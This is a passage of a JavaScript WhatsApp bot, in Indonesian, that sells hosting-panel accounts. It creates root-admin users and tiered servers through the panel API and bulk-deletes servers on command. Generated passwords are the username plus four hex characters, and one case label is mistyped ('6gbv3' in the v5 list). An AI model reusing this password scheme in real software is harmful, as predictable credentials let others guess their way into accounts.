━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "cadminv3": {
if (!isCreator && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain3}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "cadminv4": {
if (!isCreator && !isAdpbos4 && !isAdpbos5) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain4}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "cadminv5": {
if (!isCreator && !isAdpbos5) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
  🚚 *PERMISI, PESANAN ADP ANDA TELAH SAMPAI!* 📦  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✅ *Berhasil Membuat Admin Panel* ✅

📌 *Detail Akun Panel Anda:*  
───────────────────────────────  
🆔 *ID User:* ${user.id}  
📛 *Nama:* ${user.first_name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password.toString()}  
🌐 *Login URL:* ${global.domain5}  
───────────────────────────────  

❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  
⏳ *Masa Aktif:* 30 HARI  
📆 *Garansi:* 10 HARI  
❏▭▬▭▬▭▬▭▬▭▬▭▬▭▬  

⚠️ *Rules Admin Panel* ⚠️  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ Dilarang intip panel orang.  
2️⃣ Dilarang otak-atik panel.  
3️⃣ Dilarang ganti nama panel.  
4️⃣ Dilarang ambil script orang.  
5️⃣ Dilarang create admin panel tanpa izin.  
6️⃣ Dilarang otak-atik Node.js.  
7️⃣ Dilarang melakukan perubahan sembarangan.  

📢 *Penting:*  
*Claim garansi wajib membawa bukti screenshot chat saat pembelian.*  
‼️ Jangan nekat jika tidak paham! Pastikan melihat tutorial di YouTube.  
🛑 Jika ada kesalahan fatal, akun Anda dapat dihapus, *no refund & no comment*!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Catatan Penting:*  
❗ *Owner hanya mengirimkan data akun sekali.*  
💾 *Mohon simpan data akun Anda dengan baik.*  
⛔ Jika hilang, owner tidak dapat mengirim ulang data Anda.  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
            *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isReseller && !isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break
case "1gbv2": case "2gbv2": case "3gbv2": case "4gbv2": case "5gbv2": case "6gbv2": case "7gbv2": case "8gbv2": case "9gbv2": case "10gbv2": case "unlimitedv2": case "unliv2": {
if (!isReseller2 && !isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel2 = text
var ram
var disknya
var cpu
if (command == "1gbv2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gbv2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gbv2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gbv2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gbv2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gbv2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gbv2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gbv2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gbv2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel2.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain2 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel2
}
break

case "1gbv3": case "2gbv3": case "3gbv3": case "4gbv3": case "5gbv3": case "6gbv3": case "7gbv3": case "8gbv3": case "9gbv3": case "10gbv3": case "unlimitedv3": case "unliv3": {
if (!isReseller3 && !isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel3 = text
var ram
var disknya
var cpu
if (command == "1gbv3") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv3") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gbv3") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gbv3") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gbv3") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gbv3") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gbv3") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gbv3") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gbv3") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gbv3") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel3.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain3 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey3
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain3 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey3,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain3}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel3
}
break
case "1gbv4": case "2gbv4": case "3gbv4": case "4gbv4": case "5gbv4": case "6gbv4": case "7gbv4": case "8gbv4": case "9gbv4": case "10gbv4": case "unlimitedv4": case "unliv4": {
if (!isReseller4 && !isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel4 = text
var ram
var disknya
var cpu
if (command == "1gbv4") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv4") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gbv4") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gbv4") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gbv4") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gbv4") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gbv4") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gbv4") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gbv4") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gbv4") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel4.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain4 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey4
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain4 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey4,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain4}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel4
}
break

case "1gbv5": case "2gbv5": case "3gbv5": case "4gbv5": case "5gbv5": case "6gbv3": case "7gbv5": case "8gbv5": case "9gbv5": case "10gbv5": case "unlimitedv5": case "unliv5": {
if (!isReseller5 && !isCreator && !isAdpbos && !isAdpbos2 && !isAdpbos3 && !isAdpbos4 && !isAdpbos5) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel5 = text
var ram
var disknya
var cpu
if (command == "1gbv5") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gbv5") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gbv5") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gbv5") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gbv5") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gbv5") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gbv5") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gbv5") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gbv5") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gbv5") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel5.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain5 + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey5
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain5 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey5,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain5}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *SYAH HOSTING*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await syah.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel5
}
break
case 'clearserver':
    case 'clearpanel': {
    if (!isCreator) return syahreply(mess.owner)
    
    const argsString = body.trim()
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim())

    if (excludedIds.length === 0) {
        return syahreply(`Masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: *${prefix+command}* , 48, 49, 50`)
    }

    try {syahreply("Proses penghapusan server 🚀")

        let servers = []
        let page = 1
        while (true) {
            let f = await fetch(`${domain}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            })

            let res = await f.json()
            if (!res.data || res.data.length === 0) break

            servers.push(...res.data)
            page++
        }

        if (servers.length === 0) {
            return syahreply('❌ Tidak ada server yang ditemukan.')
        }

        let deletedServers = []
        let failedServers = []

        for (let server of servers) {
            let s = server.attributes

            if (excludedIds.includes(s.id.toString())) {
                continue
            }

            let deleteServer = await fetch(`${domain}/api/application/servers/${s.id}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
